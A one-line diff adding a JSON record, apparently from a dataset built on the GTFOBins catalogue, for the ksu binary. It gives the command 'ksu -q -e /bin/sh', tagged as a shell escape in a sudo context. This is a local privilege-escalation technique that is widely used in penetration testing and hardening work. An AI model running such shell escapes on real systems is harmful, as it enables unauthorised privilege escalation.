@@ -1,0 +1,1 @@
+{"title": "ksu", "source": "gtfobins", "source_label": "GTFOBins", "path": "ksu", "html": "<h1>ksu</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">ksu -q -e /bin/sh</code></pre>", "excerpt": "ksu Shell ksu -q -e /bin/sh", "tags": ["func:shell", "ctx:sudo"]}
